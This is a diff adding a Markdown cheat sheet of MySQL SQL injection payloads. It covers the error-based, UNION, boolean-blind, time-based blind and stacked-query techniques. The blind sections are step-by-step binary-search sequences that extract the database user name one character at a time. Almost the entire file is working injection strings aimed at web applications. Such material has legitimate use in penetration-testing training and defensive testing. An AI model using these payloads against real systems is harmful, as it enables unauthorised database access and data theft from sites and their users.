@@ -1,0 +1,387 @@
+# MySQL
+
+## Error-based
+This technique forces the database to generate an error that includes the leaked data in the error message, useful for quick extraction when errors are displayed.
+
+To retrieve the database version:
+' AND UPDATEXML(1,CONCAT(0x2e,version()),1) --
+
+To retrieve the current user:
+' AND UPDATEXML(1,CONCAT(0x2e,user()),1) --
+
+## Union query-based
+Append a UNION SELECT to merge results from your query with the original, extracting data directly into the response columns.
+
+To retrieve the database version:
+' UNION SELECT NULL, @@version --
+
+To retrieve the current user:
+' UNION SELECT NULL, user() --
+
+## Boolean-based blind
+Send conditions that change the application's behavior based on whether the condition is true or false, allowing inference of data without seeing direct output.
+
+To find length of current user (binary search, assume 5):
+
+Check if LENGTH(user()) > 16:
+' AND IF(LENGTH(user())>16,1,0)=1 --
+
+(Assume false)
+
+Check if LENGTH(user()) > 8:
+' AND IF(LENGTH(user())>8,1,0)=1 --
+
+(Assume false)
+
+Check if LENGTH(user()) > 4:
+' AND IF(LENGTH(user())>4,1,0)=1 --
+
+(Assume true)
+
+Check if LENGTH(user()) > 6:
+' AND IF(LENGTH(user())>6,1,0)=1 --
+
+(Assume false)
+
+Check if LENGTH(user()) > 5:
+' AND IF(LENGTH(user())>5,1,0)=1 --
+
+(Assume false)
+
+Check if LENGTH(user()) = 5:
+' AND IF(LENGTH(user())=5,1,0)=1 --
+
+(Assume true)
+
+To extract characters ('admin'):
+
+Position 1 ('a'=97):
+
+Check if ASCII(SUBSTR(user(),1,1)) > 109:
+' AND IF(ASCII(SUBSTR(user(),1,1))>109,1,0)=1 --
+
+(Assume false)
+
+Check if > 103:
+' AND IF(ASCII(SUBSTR(user(),1,1))>103,1,0)=1 --
+
+(Assume false)
+
+Check if > 100:
+' AND IF(ASCII(SUBSTR(user(),1,1))>100,1,0)=1 --
+
+(Assume false)
+
+Check if > 98:
+' AND IF(ASCII(SUBSTR(user(),1,1))>98,1,0)=1 --
+
+(Assume false)
+
+Check if > 97:
+' AND IF(ASCII(SUBSTR(user(),1,1))>97,1,0)=1 --
+
+(Assume false)
+
+Check if = 97:
+' AND IF(ASCII(SUBSTR(user(),1,1))=97,1,0)=1 --
+
+(Assume true)
+
+Position 2 ('d'=100):
+
+Check if > 109:
+' AND IF(ASCII(SUBSTR(user(),2,1))>109,1,0)=1 --
+
+(Assume false)
+
+Check if > 103:
+' AND IF(ASCII(SUBSTR(user(),2,1))>103,1,0)=1 --
+
+(Assume false)
+
+Check if > 100:
+' AND IF(ASCII(SUBSTR(user(),2,1))>100,1,0)=1 --
+
+(Assume false)
+
+Check if > 98:
+' AND IF(ASCII(SUBSTR(user(),2,1))>98,1,0)=1 --
+
+(Assume true)
+
+Check if > 99:
+' AND IF(ASCII(SUBSTR(user(),2,1))>99,1,0)=1 --
+
+(Assume true)
+
+Check if = 100:
+' AND IF(ASCII(SUBSTR(user(),2,1))=100,1,0)=1 --
+
+(Assume true)
+
+Position 3 ('m'=109):
+
+Check if > 109:
+' AND IF(ASCII(SUBSTR(user(),3,1))>109,1,0)=1 --
+
+(Assume false)
+
+Check if > 103:
+' AND IF(ASCII(SUBSTR(user(),3,1))>103,1,0)=1 --
+
+(Assume true)
+
+Check if > 106:
+' AND IF(ASCII(SUBSTR(user(),3,1))>106,1,0)=1 --
+
+(Assume true)
+
+Check if > 108:
+' AND IF(ASCII(SUBSTR(user(),3,1))>108,1,0)=1 --
+
+(Assume true)
+
+Check if > 109:
+' AND IF(ASCII(SUBSTR(user(),3,1))>109,1,0)=1 --
+
+(Assume false)
+
+Check if = 109:
+' AND IF(ASCII(SUBSTR(user(),3,1))=109,1,0)=1 --
+
+(Assume true)
+
+Position 4 ('i'=105):
+
+Check if > 109:
+' AND IF(ASCII(SUBSTR(user(),4,1))>109,1,0)=1 --
+
+(Assume false)
+
+Check if > 103:
+' AND IF(ASCII(SUBSTR(user(),4,1))>103,1,0)=1 --
+
+(Assume true)
+
+Check if > 106:
+' AND IF(ASCII(SUBSTR(user(),4,1))>106,1,0)=1 --
+
+(Assume false)
+
+Check if > 104:
+' AND IF(ASCII(SUBSTR(user(),4,1))>104,1,0)=1 --
+
+(Assume true)
+
+Check if > 105:
+' AND IF(ASCII(SUBSTR(user(),4,1))>105,1,0)=1 --
+
+(Assume false)
+
+Check if = 105:
+' AND IF(ASCII(SUBSTR(user(),4,1))=105,1,0)=1 --
+
+(Assume true)
+
+Position 5 ('n'=110):
+
+Check if > 109:
+' AND IF(ASCII(SUBSTR(user(),5,1))>109,1,0)=1 --
+
+(Assume true)
+
+Check if > 116:
+' AND IF(ASCII(SUBSTR(user(),5,1))>116,1,0)=1 --
+
+(Assume false)
+
+Check if > 113:
+' AND IF(ASCII(SUBSTR(user(),5,1))>113,1,0)=1 --
+
+(Assume false)
+
+Check if > 111:
+' AND IF(ASCII(SUBSTR(user(),5,1))>111,1,0)=1 --
+
+(Assume false)
+
+Check if > 110:
+' AND IF(ASCII(SUBSTR(user(),5,1))>110,1,0)=1 --
+
+(Assume false)
+
+Check if = 110:
+' AND IF(ASCII(SUBSTR(user(),5,1))=110,1,0)=1 --
+
+(Assume true)
+
+## Time-based blind
+Introduce a delay (e.g., SLEEP) only if the condition is true, allowing inference from response timing differences.
+
+Base delay test:
+' AND IF(1=1,SLEEP(5),0) --
+
+To find length (binary search):
+
+' AND IF(LENGTH(user())>16,SLEEP(5),0) --
+
+(No delay)
+
+' AND IF(LENGTH(user())>8,SLEEP(5),0) --
+
+(No delay)
+
+' AND IF(LENGTH(user())>4,SLEEP(5),0) --
+
+(Delay)
+
+' AND IF(LENGTH(user())>6,SLEEP(5),0) --
+
+(No delay)
+
+' AND IF(LENGTH(user())>5,SLEEP(5),0) --
+
+(No delay)
+
+' AND IF(LENGTH(user())=5,SLEEP(5),0) --
+
+(Delay)
+
+To extract characters (delay if true):
+
+Position 1:
+
+' AND IF(ASCII(SUBSTR(user(),1,1))>109,SLEEP(5),0) --
+
+(No delay)
+
+' AND IF(ASCII(SUBSTR(user(),1,1))>103,SLEEP(5),0) --
+
+(No delay)
+
+' AND IF(ASCII(SUBSTR(user(),1,1))>100,SLEEP(5),0) --
+
+(No delay)
+
+' AND IF(ASCII(SUBSTR(user(),1,1))>98,SLEEP(5),0) --
+
+(No delay)
+
+' AND IF(ASCII(SUBSTR(user(),1,1))>97,SLEEP(5),0) --
+
+(No delay)
+
+' AND IF(ASCII(SUBSTR(user(),1,1))=97,SLEEP(5),0) --
+
+(Delay)
+
+Position 2:
+
+' AND IF(ASCII(SUBSTR(user(),2,1))>109,SLEEP(5),0) --
+
+(No delay)
+
+' AND IF(ASCII(SUBSTR(user(),2,1))>103,SLEEP(5),0) --
+
+(No delay)
+
+' AND IF(ASCII(SUBSTR(user(),2,1))>100,SLEEP(5),0) --
+
+(No delay)
+
+' AND IF(ASCII(SUBSTR(user(),2,1))>98,SLEEP(5),0) --
+
+(Delay)
+
+' AND IF(ASCII(SUBSTR(user(),2,1))>99,SLEEP(5),0) --
+
+(Delay)
+
+' AND IF(ASCII(SUBSTR(user(),2,1))=100,SLEEP(5),0) --
+
+(Delay)
+
+Position 3:
+
+' AND IF(ASCII(SUBSTR(user(),3,1))>109,SLEEP(5),0) --
+
+(No delay)
+
+' AND IF(ASCII(SUBSTR(user(),3,1))>103,SLEEP(5),0) --
+
+(Delay)
+
+' AND IF(ASCII(SUBSTR(user(),3,1))>106,SLEEP(5),0) --
+
+(Delay)
+
+' AND IF(ASCII(SUBSTR(user(),3,1))>108,SLEEP(5),0) --
+
+(Delay)
+
+' AND IF(ASCII(SUBSTR(user(),3,1))>109,SLEEP(5),0) --
+
+(No delay)
+
+' AND IF(ASCII(SUBSTR(user(),3,1))=109,SLEEP(5),0) --
+
+(Delay)
+
+Position 4:
+
+' AND IF(ASCII(SUBSTR(user(),4,1))>109,SLEEP(5),0) --
+
+(No delay)
+
+' AND IF(ASCII(SUBSTR(user(),4,1))>103,SLEEP(5),0) --
+
+(Delay)
+
+' AND IF(ASCII(SUBSTR(user(),4,1))>106,SLEEP(5),0) --
+
+(No delay)
+
+' AND IF(ASCII(SUBSTR(user(),4,1))>104,SLEEP(5),0) --
+
+(Delay)
+
+' AND IF(ASCII(SUBSTR(user(),4,1))>105,SLEEP(5),0) --
+
+(No delay)
+
+' AND IF(ASCII(SUBSTR(user(),4,1))=105,SLEEP(5),0) --
+
+(Delay)
+
+Position 5:
+
+' AND IF(ASCII(SUBSTR(user(),5,1))>109,SLEEP(5),0) --
+
+(Delay)
+
+' AND IF(ASCII(SUBSTR(user(),5,1))>116,SLEEP(5),0) --
+
+(No delay)
+
+' AND IF(ASCII(SUBSTR(user(),5,1))>113,SLEEP(5),0) --
+
+(No delay)
+
+' AND IF(ASCII(SUBSTR(user(),5,1))>111,SLEEP(5),0) --
+
+(No delay)
+
+' AND IF(ASCII(SUBSTR(user(),5,1))>110,SLEEP(5),0) --
+
+(No delay)
+
+' AND IF(ASCII(SUBSTR(user(),5,1))=110,SLEEP(5),0) --
+
+(Delay)
+
+## Stacked queries
+If the database driver allows multiple statements, you can chain queries separated by semicolons to execute additional selects.
+
+To retrieve the database version:
+'; SELECT @@version --
+
